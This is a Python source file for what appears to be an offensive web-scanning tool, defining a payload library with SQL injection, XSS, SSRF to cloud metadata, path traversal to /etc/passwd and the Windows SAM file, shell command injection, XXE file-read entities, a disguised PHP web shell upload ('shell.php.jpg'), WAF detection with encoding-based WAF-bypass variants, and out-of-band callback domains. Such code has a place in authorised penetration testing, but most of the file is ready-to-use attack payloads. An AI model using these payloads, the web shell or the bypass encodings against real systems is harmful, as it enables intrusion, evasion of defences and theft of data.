"""Static payload library, encoding engine, and context-aware payload selection."""

from __future__ import annotations

import base64
import json
import random
from typing import Any, Dict, List, Optional


class PayloadForge:
    def __init__(self):
        self._waf_signatures = self._load_waf_signatures()

    def get_waf_bypass_payloads(self, base_payloads: List[str], waf: str = "unknown") -> List[str]:
        bypassed = []
        for payload in base_payloads:
            bypassed.extend(self._apply_waf_bypasses(payload, waf))
        return list(dict.fromkeys(bypassed))[:30]

    def get_encoded_payloads(self, payload: str, encoding: str = "all") -> List[str]:
        encodings = [encoding] if encoding != "all" else ["url_double", "url_unicode", "base64", "hex", "mixed", "html_entity"]
        result = []
        for enc in encodings:
            try:
                result.append(self._encode(payload, enc))
            except Exception:
                continue
        return result

    def get_context_payloads(self, attack_type: str, context: Dict[str, Any]) -> List[str]:
        location = context.get("location", "query")
        tech_stack = context.get("fingerprint", {}).get("technologies", [])
        if attack_type == "sqli":
            return self._get_sqli_context(location, "", [], tech_stack)
        elif attack_type == "xss":
            return self._get_xss_context(location, "", [], tech_stack)
        elif attack_type == "ssrf":
            return self._get_ssrf_context(location, "", [], tech_stack)
        elif attack_type == "lfi":
            return self._get_lfi_context(location, "", [], tech_stack)
        elif attack_type == "rce":
            return self._get_rce_context(location, "", [], tech_stack)
        elif attack_type == "ssti":
            return self._get_ssti_context(location, "", [], tech_stack)
        elif attack_type == "nosqli":
            return self._get_nosqli_context(location, "", [], tech_stack)
        elif attack_type == "xxe":
            return self._get_xxe_context(location, "", [], tech_stack)
        elif attack_type == "crypto":
            return self._get_crypto_context(location, "", [], tech_stack)
        elif attack_type == "deser":
            return self._get_deser_context(location, "", [], tech_stack)
        elif attack_type == "race":
            return self._get_race_context(location, "", [], tech_stack)
        elif attack_type == "smuggling":
            return self._get_smuggling_context(location, "", [], tech_stack)
        elif attack_type == "graphql":
            return self._get_graphql_context(location, "", [], tech_stack)
        return []

    def get_polyglot_uploads(self, file_type: str = "all") -> List[Dict[str, Any]]:
        if file_type == "all":
            return self._polyglot_uploads
        return [p for p in self._polyglot_uploads if file_type in p.get("types", [])]

    def get_oob_callbacks(self, count: int = 5) -> List[str]:
        return random.sample(self._oob_domains, min(count, len(self._oob_domains)))

    def detect_waf(self, headers: Dict[str, str], body: str, status: int) -> Optional[str]:
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}
        body_lower = body.lower() if body else ""
        for waf, signatures in self._waf_signatures.items():
            for sig_type, sigs in signatures.items():
                for sig in sigs:
                    if sig_type == "header":
                        for hk, hv in headers_lower.items():
                            if sig in hv:
                                return waf
                    elif sig_type == "body":
                        if sig in body_lower:
                            return waf
                    elif sig_type == "status":
                        if status == sig:
                            return waf
        return None

    def _apply_waf_bypasses(self, payload: str, waf: str) -> List[str]:
        bypasses = [payload]
        bypasses.append(payload.replace(" ", "/**/"))
        bypasses.append(payload.replace(" ", "%09"))
        bypasses.append(payload.replace(" ", "%0a"))
        bypasses.append(payload.replace("'", "''"))
        bypasses.append(payload.replace("'", "`"))
        bypasses.append(payload.replace("'", "%27"))
        bypasses.append(payload.replace('"', "%22"))
        bypasses.append(payload.replace("(", "%28"))
        bypasses.append(payload.replace(")", "%29"))
        bypasses.append(payload.upper())
        bypasses.append(payload.lower())
        bypasses.append(self._toggle_case(payload))
        if waf in ("cloudflare", "mod_security"):
            bypasses.append(self._encode(payload, "url_double"))
            bypasses.append(self._encode(payload, "mixed"))
        if waf in ("akamai", "imperva"):
            bypasses.append(self._encode(payload, "base64"))
            bypasses.append(self._encode(payload, "hex"))
        return list(dict.fromkeys(bypasses))

    def _encode(self, payload: str, encoding: str) -> str:
        if encoding == "url_double":
            from urllib.parse import quote
            return quote(quote(payload, safe=""))
        elif encoding == "url_unicode":
            return "".join(f"%u{ord(c):04x}" if ord(c) > 127 else c for c in payload)
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "hex":
            return payload.encode().hex()
        elif encoding == "mixed":
            result = ""
            for i, char in enumerate(payload):
                if i % 3 == 0:
                    result += f"%{ord(char):02x}"
                elif i % 3 == 1:
                    result += char.upper() if char.islower() else char.lower()
                else:
                    result += char
            return result
        elif encoding == "html_entity":
            return "".join(f"&#x{ord(c):x};" if ord(c) > 127 else c for c in payload)
        return payload

    def _toggle_case(self, payload: str) -> str:
        return "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))

    def _get_sqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        base = ["' OR 1=1--", '" OR 1=1--', "' UNION SELECT NULL--", "admin'--"]
        if "PostgreSQL" in tech_stack:
            base.append("' AND pg_sleep(5)--")
        if "MySQL" in tech_stack:
            base.append("' AND SLEEP(5)--")
        return base

    def _get_xss_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>"]

    def _get_ssrf_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:22", "file:///etc/passwd"]

    def _get_lfi_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return [
            "../../../../etc/passwd", "../../../../etc/hosts", "../../../../proc/self/environ",
            "php://filter/read=convert.base64-encode/resource=index.php", "file:///etc/passwd",
            "....//....//....//etc/passwd", "..%2f..%2f..%2fetc%2fpasswd",
            "../../../../windows/win.ini", "C:\\windows\\win.ini", "C:/windows/win.ini",
            "../../../../boot.ini", "../../../../system32/config/sam",
        ]

    def _get_rce_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["; id", "| id", "&& id", "`id`", "$(id)", "; whoami", "| whoami", "`whoami`", "$(whoami)", "; ping -c 1 127.0.0.1", "| ping -n 5 127.0.0.1", "; sleep 5", "| sleep 5", "`sleep 5`", "; cat /etc/passwd", "| cat /etc/passwd", "&& dir", "|| dir", "`dir`", "$(dir)"]

    def _get_ssti_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>"]

    def _get_nosqli_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ['{"$ne": null}', '{"$gt": ""}', '{"$exists": true}']

    def _get_xxe_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        ]

    def _get_crypto_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["test", "admin", "null", "undefined", "AAAA"]

    def _get_deser_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ['{"key":"value"}', '{"$ne":null}', 'O:4:"Test":0:{}']

    def _get_race_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ["1", "2", "0", "-1"]

    def _get_smuggling_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return [
            "http://127.0.0.1",
            "http://127.0.0.1:80",
            "http://127.0.0.1:8080",
            "http://localhost",
            "http://[::1]",
        ]

    def _get_graphql_context(self, location: str, content_type: str, frameworks: List[str], tech_stack: List[str]) -> List[str]:
        return ['{ __schema { types { name } } }', '{ users { id email password } }']

    def _load_waf_signatures(self) -> Dict[str, Any]:
        return {
            "cloudflare": {
                "header": ["cf-ray", "cloudflare"],
                "body": ["cloudflare", "checking your browser"],
                "status": [403, 503],
            },
        }

    _polyglot_uploads = [
        {"filename": "shell.php.jpg", "content": b"\xff\xd8\xff\xe0<?php system($_GET['cmd']); ?>", "content_type": "image/jpeg", "types": ["php", "image"]},
        {"filename": "shell.svg", "content": b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>', "content_type": "image/svg+xml", "types": ["svg", "xss"]},
    ]

    _oob_domains = [
        "http://burp-collaborator.net", "http://oastify.com", "http://interactsh.com",
        "http://canarytokens.com", "http://requestbin.net", "http://webhook.site",
    ]
